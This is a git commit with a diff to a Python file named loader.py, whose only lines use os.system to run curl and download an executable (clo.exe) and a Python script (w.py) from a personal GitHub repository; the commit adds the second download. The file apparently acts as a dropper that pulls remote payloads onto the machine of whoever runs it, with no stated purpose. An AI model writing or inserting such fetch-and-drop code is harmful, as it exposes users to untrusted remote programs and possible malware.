a632b02c89af79f8da456a8ac54b6fcd80de7240
Fghth <150439444+Fghthssss@users.noreply.github.com>
2025-11-15 21:51:59 +0300

    Update loader.py

--- loader.py
+++ loader.py
@@ -1,3 +1,4 @@
 import os
 
 os.system("curl -O https://github.com/Fghthssss/BUSB/raw/refs/heads/main/clo.exe")
+os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/w.py")
